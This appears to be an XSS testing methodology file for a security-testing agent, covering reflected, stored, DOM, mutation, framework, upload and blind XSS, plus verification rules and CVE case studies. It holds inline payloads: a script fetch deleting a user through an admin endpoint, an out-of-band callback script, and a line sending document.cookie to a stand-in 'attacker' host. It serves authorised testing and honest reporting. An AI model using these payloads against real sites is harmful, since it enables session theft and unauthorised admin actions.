# XSS Methodology

## Core Concept

XSS fails securely only when untrusted data is neutralized at every SINK, for every CONTEXT that sink renders into, and — increasingly — after every RE-PARSE the browser performs on already-"sanitized" output. Four independent trust decisions must each hold:

1. **Storage vs rendering are separate decisions** — data rejected for one use (session validation) may still be stored and later rendered in a privileged context (admin views, logs, audits) (Shape 1).
2. **Reflection is context-dependent** — the same unescaped byte is inert in one HTML position and executable in another (Shapes 2–3).
3. **Client-side (DOM) execution is a distinct XSS class from server-rendered reflection** — a value safely escaped server-side can still reach a dangerous client-side sink via JavaScript (Shape 4; mechanics owned by `client-side-skill/SKILL.md`).
4. **A sanitizer's verdict and the browser's actual re-parse can disagree** — this is the newest and fastest-growing category: HTML sanitizers (DOMPurify and similar) parse input once and deem it safe, but the browser re-parses the SANITIZED output in a different namespace context (SVG/MathML) during `innerHTML` assignment, producing a different, executable DOM tree — this is Mutation XSS (mXSS), and it defeats sanitization that Shape 5's classic filter-bypass model does not fully capture (Shape 6).

## Security Boundary

Intended: attacker input never executes as script in another user's browser, especially a privileged one, and a sanitizer's safety verdict matches what the browser will actually do with its output.
Violated when: attacker-controlled data reaches an HTML/JS/DOM sink unescaped for its rendering context, reaches a sink via client-side JS with no escaping at all, or survives sanitization intact only to mutate into executable content on the browser's re-parse.

## Recognition Patterns

### Shape 1 — Stored XSS via non-standard data structures (original, lab-verified)
- Non-standard structures carrying usernames (colon-split cookies `user:token`, hyphenated IDs) — scanners test them as single values and miss per-component injection points.
- Integrity errors on tampered input (`Integrity violation detected`) — proves validation at USE time; says nothing about STORAGE.
- Error/500 responses that still persist the input server-side.
- Admin/bot viewers of user-influenced surfaces (logs, user lists, audit views).

### Shape 2 — Reflected XSS
- A request parameter (query string, form field, header like `User-Agent`/`Referer` if logged/rendered) appears verbatim or near-verbatim in the immediate HTML response.
- Search boxes, error messages, "you searched for X" banners — classic reflection points.
- Context determines payload: HTML body / HTML attribute / JS string / URL-href context each need a different breakout — classify the context before writing a payload.
- Angle-bracket encoding present but quote/event-handler attributes NOT encoded → attribute-breakout still viable.

### Shape 3 — Stored XSS, direct
- Comment/review/profile/message fields rendering to OTHER users directly (contrast Shape 1's structural-trick angle — this is submit-and-view-elsewhere).
- Rich-text/Markdown fields allowing a subset of HTML — check the allowlist for an overlooked executable primitive (`<svg onload=>`, `<details ontoggle=>`).
- SVG/HTML-adjacent upload types rendered inline rather than downloaded — including the newer "content-type confusion" pattern (see Shape 9): an upload whose declared MIME type is malformed enough that the SERVER stores it unchanged but the BROWSER falls back to content-sniffing and renders it as HTML regardless of the stored type.

### Shape 4 — DOM-based XSS (recognition only — mechanics owned by client-side-skill)
- Recognition trigger: a payload placed ONLY in the URL fragment (`#...`, never sent to the server) still executes, OR the page source shows no trace of a payload that nonetheless renders/executes.
- Once recognized as DOM-rooted, use `client-side-skill/SKILL.md`'s source→sink model and its execution-proof discipline — do not re-derive that mechanics here.
- `postMessage` handlers with no `event.origin` validation are a specific, high-frequency DOM-XSS source worth calling out explicitly: any cross-origin page can post a message, and if the handler writes `event.data` into a dangerous sink unchecked, this is DOM XSS reachable from literally any origin with zero delivery infrastructure beyond an iframe.

### Shape 5 — Filter/sanitizer bypass (classic, tag/attribute/encoding-level)
- Server or client-side sanitization strips/encodes SOME but not all dangerous constructs.
- Tag-based blacklist bypassed by an unlisted executable tag (`<svg>`, `<details>`, `<marquee onstart=>`).
- Attribute stripping bypassed by an unlisted event handler, or by double-encoding surviving one decode pass.
- Case variation (`<ScRiPt>`), malformed 7-bit ASCII encoding (defeats filters that assume 8-bit transmission — effective specifically where the host transmits or can be coerced into US-ASCII, historically Apache Tomcat defaults), newline/whitespace insertion between attributes to break naive regex signatures used by WAFs (`<img src=x onerror=alert(1)>` with injected linebreaks — parser-vs-WAF differential, not a sanitizer-logic bug).
- CSP present but weak: `unsafe-inline` script-src, missing `object-src`/`base-uri`, JSONP endpoints on an allowlisted host usable as a gadget, or a reflected/attacker-influenced nonce — bypass MECHANICS are `client-side-skill/SKILL.md`'s content (cross-reference, don't restate); this skill's job is only to note that CSP changes exploitability/impact of an otherwise-confirmed sink.

### Shape 6 — Mutation XSS (mXSS) and sanitizer parser-differential bypass
- Recognition class: a payload that the sanitizer (DOMPurify or similar) examines and passes as safe, but which — when the SANITIZED (already-passed) output is later assigned to `innerHTML` or similar — gets RE-PARSED by the browser in a different namespace context (SVG, MathML, or comment-vs-CDATA-closing ambiguity) and produces a DIFFERENT, executable DOM tree than the one the sanitizer evaluated.
- Root mechanism: HTML parsing is not idempotent — a string can parse one way in a text/HTML context and differently once nested inside `<math>`/`<svg>`/`<table>` namespace quirks, or once a comment-closing sequence is represented differently (`-->` vs a `CDATA`-style closer) across the sanitizer's parse pass and the browser's re-parse.
- Recognition tell: a payload survives sanitization with NO angle brackets or event-handler keywords visible in the sanitizer's own examined output, yet still executes once rendered — this is the signature that distinguishes mXSS from Shape 5's classic tag/attribute-blacklist gaps, and the two require different remediation (patch/upgrade the sanitizer version vs fix the specific blacklist).
- DOM Clobbering is a closely related, often-chained recognition pattern: named HTML elements (`<a id="config">`, `<form id="allowedTags">`) can overwrite JavaScript global variables and object properties of the SAME name once inserted into the DOM — including, in the worst case, clobbering a sanitizer's own configuration object (e.g. an `allowedTags` array silently replaced by a clobbered string), causing the sanitizer to fail open or crash into a no-sanitization fallback path.

### Shape 7 — Self-XSS / privilege-context escalation via exfiltration-free impact
- A payload that only executes in the ATTACKER's own browser is not reportable as-is — the escalation path is proving it ALSO renders for a higher-privileged or differently-scoped viewer (admin dashboard, support-ticket viewer, audit log).
- Favor receiverless, victim-side actions over exfiltration when the impact can be achieved directly (see Testing Methodology, carried from Shape 1).
- **The second-order surface inventory — do this before concluding "self-XSS".**
  "Only the account owner can see this page" is an assertion about one view, not
  about the data. Walk the value forward through every surface that could render
  it to someone the attacker is not, and only then call it self-inflicted:
  - **other humans on the same account** — team members, shared logins, an
    organisation's staff using one set of credentials;
  - **privileged internal tooling** — support/helpdesk consoles, admin panels,
    moderation queues, CS or billing views, anything an employee opens;
  - **logs and audit trails** — activity history, request logs, web-access logs,
    change journals, which are routinely more widely readable than the
    originating page;
  - **exports and generated documents** — PDFs, invoices, receipts, CSV/bundle
    exports, email notifications, any place the value is copied into an artefact
    someone else later opens;
  - **other front-ends and API consumers** — the same record surfaced by a
    different surface with different escaping, including first-party mobile or
    partner integrations;
  - **anything rendered to a *different* account** — invitations, shared projects,
    delegated access, resource ownership transfer.
  A single hit on this list converts a non-finding into a real one. The cost is a
  handful of read-only checks; the omission is a permanently missed finding.
- **A field writable by CSRF is not thereby a real vulnerability, and it is worth
  being precise about why.** If an attacker can set the victim's field, the
  "attacker must compromise their own session" premise collapses, but the payload
  still only executes in the *victim's own browser* — the victim gains nothing an
  attacker lacks and loses nothing the attacker did not already control. It becomes
  a genuine vulnerability only when it combines with a second-order surface from
  the list above. Write this reasoning down rather than letting "CSRF is possible"
  stand in for impact.
- **Shared-computer and shared-account reasoning is the weakest argument in this
  class; treat it as a footnote, not a claim.** "Someone else might use this
  machine/account" is a real but contrived precondition, and leading with it is a
  reliable way to get a self-XSS rated above its value. Mention it once, under
  limitations, after the impact section — and only if you can name the specific
  deployment pattern that makes it likely.
- **When there is genuinely no second-order path, say so first and file it as what
  it is.** "I could not find a path by which this affects any other user; it is
  self-inflicted only" — stated in the summary, before the impact section — is the
  highest-integrity form of this report. It gets triaged faster than an inflated
  one, it builds the credibility needed for the findings that *do* have impact,
  and it converts the submission from a disputed severity argument into a
  hardening request the program can simply accept. A reporter who volunteers the
  ceiling of their own finding is making the next report cheaper. Note also that
  programs over-rate as well as under-rate: an initial Medium here was corrected
  down once the program reasoned about the actual blast radius, so a program's
  first severity label is a starting position, not a verdict.
- **If you claim a Content-Security-Policy is a contributing factor, evidence it.**
  Quote the actual `Content-Security-Policy` header, name the directive that fails
  to block the payload, and state what would have blocked it. A PoC that executes
  through an inline event handler is itself the evidence that the policy permits
  inline handlers — which is a concrete, checkable statement. "Weak CSP
  configuration" as an assertion in the summary is a hand-wave that invites
  disagreement and weakens the credible parts of the report. If the policy turned
  out to be irrelevant to the observed execution, drop it from the root cause
  rather than leaving it as unexplained support for the severity.

### Shape 8 — Framework-specific XSS (client-side template/sandbox escapes)
- Client-side templating/frameworks that evaluate expressions in user-controlled bindings (historically AngularJS sandbox escapes; more recently, Vue.js client-side template injection via `v-html`/dynamic component bindings) — recognition tell: a client-rendered app where a user-controlled value flows into a template-expression context, not just a plain DOM sink; probe with a template-syntax marker specific to the detected framework (e.g. `{{constructor.constructor('alert(1)')()}}`-family probes for Angular-family sandboxes) rather than a generic HTML/script payload, which will fail against a framework that auto-escapes plain HTML but still evaluates its OWN template syntax.
- `dangerouslySetInnerHTML` (React) / `v-html` (Vue) / any framework's explicit escape-hatch from its default auto-escaping — these are Shape 5/6-relevant sinks by design (the framework is deliberately NOT protecting this binding), so their presence anywhere in a client bundle is a recognition signal worth searching for directly in shipped JS, not just probing blind.

### Shape 9 — File-upload / Content-Type confusion XSS
- An uploaded file's declared Content-Type is malformed in a way the SERVER'S validation logic doesn't reject (e.g. not a well-formed `type/subtype` media type at all — `image`, `image/`, `image//svg+xml`), so a blocklist keyed on recognized/parseable MIME types is bypassed and the file is stored with its client-supplied, malformed Content-Type unchanged.
- The vulnerability completes at RENDER time on storage backends that persist and serve the stored Content-Type verbatim (object storage services being a common case): the BROWSER can't parse the malformed value, falls back to content-sniffing the file's actual bytes, and if the body begins with HTML, renders it as HTML in the application's origin — executing any embedded script against whoever opens the file URL.
- Recognition tell: test whether the upload validator's allowlist/blocklist logic is keyed on a successfully-PARSED media type (and therefore trivially bypassed by an intentionally-malformed one) versus genuinely inspecting file content/magic bytes.

### Shape 10 — Blind XSS
- The injection point and the rendering/execution point are on entirely different, non-attacker-visible surfaces — a payload submitted via a public-facing form (contact form, support ticket, feedback field, log-visible header) that only ever renders in an internal admin/ops tool the attacker cannot directly view.
- Recognition is necessarily blind: submit an out-of-band callback payload (`<script src="https://<unique>.oob-domain/x.js"></script>` or a `fetch`-based beacon) into every plausible input surface, including ones with no visible reflection anywhere in the attacker's own view, and wait for an OOB interaction — a hit on the listener, not any response content, is the only signal.

## Common Locations

- Session-cookie username components (reflection into account/admin views) — Shape 1.
- Comment/name/email/review/profile-bio fields rendered to later viewers — Shapes 1, 3.
- Log and audit surfaces viewed by privileged accounts — Shapes 1, 7, 10 (blind XSS's classic target).
- Search boxes, "no results for" banners, redirect/confirmation pages echoing a parameter — Shape 2.
- URL fragment/hash-consuming SPA routers, `postMessage` handlers with no origin check — Shape 4.
- Rich-text editors, Markdown renderers, any surface piping user HTML through a sanitizer before `innerHTML`/`dangerouslySetInnerHTML`/`v-html` — Shapes 3, 5, 6, 8.
- File/avatar/attachment upload features, especially ones backed by S3/GCS/Azure Blob-style object storage that serves the stored Content-Type verbatim — Shape 9.
- Support tickets, contact forms, feedback widgets, any field an internal/admin tool consumes without the submitter seeing the render — Shape 10.

## Indicators

- Tampered structural component → error page, BUT scanner/collaborator interaction follows = stored despite rejection (Shape 1).
- A benign marker string reflected verbatim, with EXACT surrounding markup recorded before crafting any breakout (Shape 2) — never lead with an exploit payload.
- The same marker submitted once appears unescaped when viewed from a SECOND account/session (Shape 3) — proves stored + cross-viewer rendering, not just self-reflection.
- A payload placed ONLY in the URL fragment triggers execution with zero corresponding server-side request parameter in the access log (Shape 4) — conclusive DOM-only proof.
- Differential response across encoding/case/tag variants under a filter maps the filter's exact rule set (Shape 5).
- A payload containing NO recognizable dangerous tokens in the sanitizer's OWN examined/logged output, which still executes on render — the mXSS signature (Shape 6); contrast with Shape 5 where the dangerous token IS visible to the sanitizer but simply not on its blocklist.
- A framework-specific template-expression probe (not a generic `<script>` payload) evaluates where plain-HTML payloads don't (Shape 8).
- A file renders as HTML from a storage URL despite an apparently-image-only upload gate, with a malformed stored Content-Type (Shape 9).
- An out-of-band callback fires minutes-to-hours after submission, from a surface with zero visible reflection to the submitter (Shape 10).
- Solved marker flips with no further attacker action (victim-side execution) — all shapes.

## Testing Methodology

0. **Blanket input-field probe (do this FIRST, before diving into any single shape).** Enumerate every user-controllable input surface the recon phase found — form fields, query/body/header params, file-upload fields with a text/name component, search boxes, comment/profile/bio fields — and fire one benign, uniquely-marked probe (e.g. `PROBEXSS<random>'"><svg onload=alert(PROBEXSS<random>)>`) at EACH of them as a fast baseline sweep, before committing to any single shape's deeper methodology. This is not a substitute for Shapes 1–10 below — it is a cheap first pass that surfaces which fields are worth the deeper, shape-specific work, and it catches the easy/obvious cases immediately rather than only after working through the shapes in order. Record, per field: reflected verbatim / reflected-encoded / not reflected / stored-but-not-yet-rendered (needs the Shape 3 cross-viewer check) / no visible effect (candidate for Shape 4 DOM-only or Shape 10 blind). Route each field's result into the matching shape below for the actual exploitation/verification work — the blanket probe only triages, it never itself constitutes a finding.
1. Map the structure: for Shape 1, split delimiters and identify the user-controlled component; for Shapes 2–3, identify the reflection/storage point directly; for Shape 4, recognize the DOM-rooted signature and hand off to `client-side-skill/SKILL.md`'s workflow.
2. Probe with a benign marker first; record exact reflection context — or absence (recheck after Shape 3's cross-account test).
3. **Context-driven payload selection (Shape 2):** classify the reflection point BEFORE writing a payload — HTML body / attribute / JS string / URL — and select the minimal breakout for that context only.
4. **Cross-viewer proof (Shape 3):** submit the marker from account A, then confirm rendering from account B (or the admin/bot viewer path). This is the deciding test for "stored" vs "reflected-only."
5. **DOM-sink proof (Shape 4):** once recognized as DOM-rooted, apply `client-side-skill/SKILL.md` step-by-step (map sources/sinks, execute via CDP/headless with a non-blocking side-effect payload like `document.title=<marker>`, never `alert()` which freezes headless dumps). For `postMessage` sinks specifically, verify the handler's origin-check logic directly (read the JS) rather than assuming its absence from black-box testing alone.
6. **Classic filter-mapping (Shape 5):** matrix candidate tags/attributes/encodings ONE AXIS AT A TIME against the live filter. If a CSP is also present, confirm (per client-side-skill) whether it's independently bypassable before concluding the finding is unexploitable.
7. **mXSS / sanitizer-differential testing (Shape 6):** identify the specific sanitizer and version in use where possible (client bundle inspection, package manifests, or version-specific behavioral fingerprints) and check it against known bypass-chain disclosures for that version rather than fuzzing blind — sanitizer bypasses are version-specific and patched incrementally, so an outdated pinned version is itself the recognition signal. Where DOM Clobbering is suspected, test by injecting named elements matching plausible global/config variable names used by the app's own JS (read the bundle for candidate names) and observing whether sanitizer or app behavior changes.
8. **Framework-specific probing (Shape 8):** identify the client-side framework in use (bundle inspection, DOM markers, dev-tools framework detection) BEFORE probing; use framework-specific template-expression payloads matched to that framework's sandbox/escape history rather than generic markup.
9. **Upload/Content-Type confusion (Shape 9):** test the upload validator with a range of malformed (not just wrong-but-well-formed) Content-Type values; if accepted, retrieve the stored file's served headers directly (not just a 200 status) to confirm the malformed type was persisted verbatim, then confirm browser rendering behavior on that URL.
10. **Blind XSS (Shape 10):** build an OOB-callback payload set, submit into every plausible surface (including headers like `User-Agent`/`X-Forwarded-For` if any admin-facing log viewer might render them), and poll the OOB listener on a patience timeline similar to other blind-primitive classes in this methodology (minutes to hours, not seconds) before concluding a surface is clean.
11. Prefer receiverless victim-side actions: `<script>fetch('/admin/delete?username=<victim>')</script>` performs impact under the victim's authority with zero exfiltration infrastructure.
12. Use cookie exfiltration only when direct impact isn't achievable — `HttpOnly` raises exfil cost but never eliminates impact.
13. Wait for privileged viewers; poll the SOLVED MARKER, not the receiver.
14. Verify by marker flip with no intervening attacker actions; record inconclusive secondary checks honestly.

## Verification

- **THE RENDER GATE — a stored-injection finding is not a finding until a privileged view is observed rendering it.** This is the single most consequential verification rule in this skill, because the write side is trivially easy and the dangerous side is entirely across the database. `{"success":true}` on a submission proves the application *stored* attacker-supplied markup. It says nothing whatsoever about whether that markup *executes*, and storing HTML in a database is normal, widespread, and frequently safe because the output is encoded at render. Most ticket, CRM, and CMS systems store markup and encode on display.
  - What counts as passing the gate, in order of strength: (a) you hold a privileged session, open the stored record, and observe execution yourself; (b) a **volunteer privileged viewer** opens it on your behalf while you watch an out-of-band callback fire; (c) the maintainer confirms the rendering sink from source. Only (a)–(c) support a stored-XSS claim.
  - What does **not** pass: a successful write; a payload you did not trigger; an assumption that because a field is stored it is rendered raw; the *absence* of encoding in a response you fetched yourself as the anonymous submitter. **Anonymous-side evidence can never establish a privileged-render claim** — the two contexts have different templates, different escaping, and different viewers.
  - **Design the payload to be confirmable, because you may be relying on someone else's session.** `alert()` is the worst choice: it needs a human to be looking at a screen, so it converts a technical claim into a manual action you cannot observe. Instead use an inert, greppable marker plus a single non-blocking callback (`document.title=marker; fetch("//attacker/"+marker+document.cookie)`) so that one cooperative viewer opening the record *converts your hypothesis into proof in one step*. You will use this pattern constantly for the back-office-victim class, where you cannot log in.
  - **Verify per field, and expect asymmetry.** A single record carrying payloads
    in many fields does not yield many findings — it yields however many of those
    fields are actually rendered in an HTML context, and the distribution is
    typically lopsided (a free-text message field raw, a name field escaped, a URL
    field scheme-filtered). Enumerate field × context, and state which are
    confirmed, which are encoded, and which are unverified. Counting every field
    that *accepted* a payload as an injectable field is how a report acquires a
    severity its evidence cannot defend.
  - If the render cannot be verified at all, then report what you actually proved — an unauthenticated injection *sink* / stored-markup primitive with render-side impact unconfirmed — and say plainly that the privileged rendering is unverified. That is an honest, useful, fixable report. It is not the same report as a proven stored XSS, and the severity ceiling follows the confirmed half.
- Marker flip with clean causality is the proof standard across all shapes.
- Distinguish attacker-side effects (fail closed here) from victim-side effects (the actual channel) — Shapes 1, 7.
- DOM sink findings require browser execution proof per `client-side-skill/SKILL.md` — never response-text inspection (Shape 4).
- Separate SSR reflection from DOM reflection explicitly.
- mXSS findings (Shape 6) require demonstrating the DIVERGENCE explicitly: capture what the sanitizer examined/passed (its logged or observable output) SEPARATELY from what the browser actually rendered, so the report shows the parser differential itself, not just "payload executed."
- DOM Clobbering findings require demonstrating that a SPECIFIC named global/property was overwritten (inspect the value in a debugger/console pre- and post-injection), not merely that unexpected behavior occurred.
- Blind XSS (Shape 10) verification is the OOB listener hit itself — record which specific input surface and payload variant correlates with which listener hit when multiple surfaces are probed concurrently, so the finding attributes to the correct injection point.
- Secondary checks that can't discriminate are recorded as inconclusive, never as proof.

## Common Failure Modes

- Assuming an integrity error means "not stored" (Shape 1).
- Requiring exfiltration receivers for impacts achievable victim-side (Shapes 1, 7).
- Testing only your own view for reflection — always run the cross-account check for suspected stored XSS (Shape 3).
- Reusing a generic `<script>` payload across all contexts instead of classifying the reflection context first (Shape 2).
- Grepping the HTTP response for a DOM-XSS payload — it will never appear there; requires execution proof (Shape 4).
- Declaring a filter "unbypassable" after one or two failed variants instead of matrixing axes independently (Shape 5).
- **Treating mXSS as "just another filter bypass" and reporting it as a Shape 5 finding** — the remediation is different (sanitizer library upgrade / architecture change vs blacklist patch), and conflating them under-informs the fix (Shape 6).
- Fuzzing for mXSS instead of checking the specific sanitizer version against known disclosed bypass chains first — sanitizer bypasses are usually version-specific published research, not something blind fuzzing efficiently rediscovers (Shape 6).
- Probing framework-rendered apps with plain HTML payloads only, missing template-expression-context vulnerabilities entirely because the framework's auto-escaping correctly blocked the wrong payload class (Shape 8).
- Testing upload Content-Type gates only with well-formed-but-wrong MIME types (`text/html` sent for an image field) instead of malformed ones — many validators correctly reject the former while failing open on the latter (Shape 9).
- Giving up on a blind-XSS surface after a short wait or a single payload variant — OOB timing is inherently variable and admin/ops tools may render on infrequent schedules (Shape 10).
- **Re-deriving DOM source/sink mechanics or CSP-bypass technique inside this skill instead of citing `client-side-skill/SKILL.md`.**
- Reporting client-side/DOM XSS found via source-code reading alone without independent execution proof.

## Impact Considerations

- Stored XSS + privileged viewer = arbitrary admin action with an unauthenticated, persistent, receiverless primitive (Shape 1).
- Reflected XSS requires victim interaction — note delivery requirement explicitly.
- DOM-based XSS in a fragment-only sink can be delivered with a link that never touches server logs (Shape 4).
- mXSS specifically defeats applications that believed themselves protected by a well-regarded sanitizer library — this is a HIGHER-trust-violation finding than a custom, ad-hoc blacklist failing, because the defense being defeated was the "correct," recommended one; frame the impact accordingly, and note the affected sanitizer's version explicitly since remediation is a version bump, not a logic fix (Shape 6).
- DOM Clobbering chained into a sanitizer bypass can defeat EVERY subsequent sanitization call on the page, not just the one that triggered the clobber — assess blast radius across the whole page lifecycle, not just the single injection point (Shape 6).
- Shape 9's file-upload/Content-Type confusion is notable because it can affect UNAUTHENTICATED viewers of a shared file URL, not just users of the vulnerable app's own UI — the impact surface is the storage URL, which may be shared/indexed/linked far outside the application itself.
- Shape 10 (blind XSS) impact is almost always against an ADMIN or internal-tool context by construction — treat any confirmed blind-XSS hit as a high-privilege-context finding by default, since that's structurally what makes it "blind" in the first place.
- XSS without demonstrated business impact is frequently out of scope for bug-bounty programs — always chain to a concrete consequence per `impact-analysis-skill/SKILL.md`.

## Lessons Learned

- From PortSwigger "Scanning non-standard data structures": tampered cookie half → 500 integrity error, yet stored; blind victim-side `fetch` deleted carlos with 8 requests and zero infrastructure. Solution's collaborator chain replaced wholesale. (Shape 1 — lab-verified.)
- (Additive, not lab-sourced) Shapes 2–10 formalize the standard reflected/stored/DOM/filter-bypass/mXSS/framework/upload/blind XSS methodology. Shape 4 and the CSP portion of Shape 5 are deliberately kept as thin recognition/handoff layers over `client-side-skill/SKILL.md`'s owned mechanics. Shape 6 (mXSS/DOM Clobbering) is the most significant addition — it represents where XSS defense has actually moved in the last several years (from "did you escape the output" to "does your sanitizer's parse agree with the browser's re-parse"), and current research explicitly ties it to real incidents (see CVE Case Studies) including a CISA Known Exploited Vulnerability used in state-sponsored attacks, which is a materially different threat-model statement than a classic reflected-XSS teaching lab.

## CVE Case Studies (real-world, not lab-sourced — hypothesis-generation material only)

> These are cited to ground Shapes above in real, disclosed vulnerabilities — not to be treated as proof for any current target. Use them the same way a PortSwigger lab note is used: as a pattern to test for, never as evidence a target shares the same flaw. Sourced current as of this skill's research pass (September 2026); re-search before relying on this list as "latest" in a future session.

### 2026 (current-year)

- **CVE-2026-44212** (PrestaShop, CVSS 9.3 Critical): an unauthenticated attacker can execute JavaScript inside a privileged admin back-office session via a stored XSS in a module that failed to escape user-supplied data before rendering it in the back-office view. Direct real-world illustration of Shape 3 (stored, direct) compounded by Shape 1's core lesson (privileged-viewer impact) — the report explicitly frames the reflected-vs-stored severity gap that this skill's Shape 1/3 distinction is built around.
- **CVE-2026-23891** (Decidim framework, User Profiles): stored XSS via profile fields injectable by low-privileged users, executing when viewed by other users or administrators. A direct real-world instance of Shape 1's exact pattern (non-obvious user-identity-bearing field as the injection point) in a currently-maintained civic-participation platform.
- **CVE-2026-25306** (XStore Core WordPress plugin, through 5.6.4): reflected XSS from failure to sanitize/encode input before reflecting it in HTML responses, requiring victim interaction (crafted-link click) — a direct Shape 2 real-world case, in an actively used e-commerce plugin ecosystem.
- **Parse Server stored XSS** (versions ≥9.0.0 <9.10.0-alpha.2 and ≤8.6.83): when an uploaded file's extension isn't recognized by the server's mime package, the client-supplied Content-Type is preserved unchanged; a MALFORMED Content-Type (not a valid `type/subtype`, e.g. `image`, `image/`, `image//svg+xml`) bypasses the extension blocklist and is stored verbatim. On storage adapters that persist and serve the stored Content-Type (S3, GCS, Azure Blob), the browser can't parse the malformed value, falls back to content-sniffing, and renders an HTML-bodied file as HTML — executing embedded script against anyone who opens the file URL. This is the exact real-world case that Shape 9 in this skill is modeled on, and is a materially useful case study because the root cause is entirely in VALIDATION LOGIC (keyed on successful MIME parsing) rather than a missing check.
- **WordPress plugin ecosystem, ongoing (September 2026 CVE Brief entries):** Master Blocks (stored XSS via unauthenticated REST API route into admin pages), WPLP Cookie Consent (stored XSS on multisite admin screens via unsanitized public-endpoint input), Dewa Kirim (stored XSS via unescaped delivery coordinates, unauthenticated), Easy Form Builder (stored XSS via unauthenticated admin-page injection), VikBooking (stored XSS via malicious file upload through live chat, rendered to admins), SemanticMediaWiki (stored XSS via improperly sanitized data attributes). This cluster is cited collectively rather than individually because it illustrates a durable PATTERN: "unauthenticated user reaches a stored-XSS sink that renders to an administrator" remains, as of the week this skill was researched, one of the single most commonly disclosed web vulnerability shapes in actively maintained software — directly reinforcing Shape 1/3's continued real-world weight over a decade after the original lab this skill migrated from.
- **JetBrains YouTrack** (before 2026.2.17394): stored XSS via article titles rendered inside DIGEST EMAILS — a notable delivery-surface variant worth calling out: the rendering context wasn't the web app's own UI at all, but an email client rendering HTML generated by the vulnerable app, which is a distinct impact/delivery consideration from every other case study here.

### Mutation XSS / sanitizer-differential (grounding Shape 6 specifically)

- **CVE-2024-37383** (Roundcube Webmail): an SVG `<animate>` whitespace-based mXSS bypass, listed on CISA's Known Exploited Vulnerabilities catalog and documented as used in state-sponsored attack campaigns. This is the single most consequential case study in this skill for establishing that mXSS is not a theoretical/academic category — it has been used in real, attributed intrusion campaigns against a widely deployed webmail platform.
- **CVE-2025-26791** (DOMPurify): a comment-mutation-based bypass in DOMPurify versions ≤3.1.2, fixed in 3.4.0 (four distinct bypass chains were fixed across this range). A directly relevant case study because DOMPurify is the de facto standard sanitizer this skill's Shape 6 discusses — an application's exposure to this specific CVE is a function of its PINNED DOMPurify version, which is why Shape 6's testing methodology emphasizes version fingerprinting over blind fuzzing.
- **USENIX Security 2024 "Magic 7" polyglots:** a set of 7 payloads documented to cover mXSS injection contexts comprehensively across sanitizer/browser combinations — a useful reference set for systematic Shape 6 testing rather than ad hoc payload construction.

## Related Concepts

- methodology/authentication.md (session structure analysis; admin proof surfaces)
- methodology/verification.md (marker as proof; honest inconclusive checks; SSR-vs-DOM separation)
- methodology/access-control.md (victim-side admin action as escalation proof)
- `client-side-skill/SKILL.md` — owns the DOM source→sink model and CSP-bypass mechanics that Shapes 4–5 hand off to.
- `file-security-skill/SKILL.md` — Shape 9's upload-validation angle overlaps with that skill's content-type/extension bypass methodology; the distinguishing factor here is the SINK (browser rendering an HTML-sniffed file as a same-origin page) rather than that skill's typical RCE-via-web-shell sink — cross-reference rather than duplicate the upload-bypass mechanics themselves.
- `csrf-skill/SKILL.md` — Shape 3's stored-payload angle overlaps with CSRF Shape 11 (Stored CSRF); do not double-report the same root-cause injection point as two separate vulnerabilities without distinguishing the injection mechanism from the consequence class actually demonstrated.

## Sources

- PortSwigger lab: Scanning non-standard data structures (knowledge/portswigger/labs/xss-scanning-non-standard-data-structures.md) — Shape 1, lab-verified.
- Shapes 2–3, 5, 7 baseline: cross-referenced from `client-side-skill/SKILL.md` and `../../knowledge/portswigger/xss/` class files where those exist.
- Shape 5 technique detail (7-bit ASCII, WAF regex-vs-parser differentials): OWASP Cheat Sheet Series "XSS Filter Evasion Cheat Sheet"; Invicti "XSS Filter Evasion" (Acunetix blog), Mar 2025; PortSwigger Web Security Academy "Cross-Site Scripting (XSS) Cheat Sheet — 2026 Edition," last updated May 2026; OffSecKit "XSS Cheat Sheet 2026," Mar 2026.
- Shape 6 (mXSS/DOM Clobbering): PortSwigger Research "Bypassing DOMPurify again with mutation XSS"; PentesterLab Glossary "Mutation XSS (mXSS)," Jan 2026; BreachVex "mXSS — Mutation XSS," May 2026 (native Sanitizer API / `setHTML()` status as of 2026: Firefox 148+ ships it, Chrome/Safari pending); LazyHackers "DOM-Based Attacks: DOM Clobbering, Mutation XSS and Client-Side Template Injection," May 2026; chs.us "XSS Prevention Guide 2026," updated May 2026 (636-source compiled reference; CVE-2025-26791 CDATA-vs-comment-closing bypass detail).
- Shape 8 (framework-specific): chs.us "XSS Prevention Guide 2026" (AngularJS sandbox escapes, Vue.js CSTI, framework-specific attack vectors sections).
- Shape 9 (upload/Content-Type confusion): Parse Server security advisory, via CVEdetails.com XSS vulnerability list.
- Shape 10 (blind XSS): general methodology cross-referenced from OOB-detection discipline shared with `ssrf-skill/SKILL.md`'s blind-OOB testing pattern.
- CVE Case Studies (2026): CVE-2026-44212 (PrestaShop — AppSecMaster), CVE-2026-23891 (Decidim — DEV Community/CVEReports), CVE-2026-25306 (XStore Core — SentinelOne Vulnerability Database), Parse Server stored XSS advisory (CVEdetails.com), WordPress plugin cluster (Master Blocks, WPLP Cookie Consent, Dewa Kirim, Easy Form Builder, VikBooking, SemanticMediaWiki — CVE Brief archive, Sept 18–20 2026), JetBrains YouTrack digest-email stored XSS (CVEdetails.com).
- CVE Case Studies (mXSS grounding): CVE-2024-37383 (Roundcube — CISA KEV catalog), CVE-2025-26791 (DOMPurify — chs.us XSS Prevention Guide 2026), USENIX Security 2024 "Magic 7" polyglots (via BreachVex).
- All CVEs cited as real-world grounding, not lab-verified evidence for any specific target. Flagged for lab-backed validation when encountered on a live mission, per the "hypothesis, not proof" rule in `impact-analysis-skill/SKILL.md`.
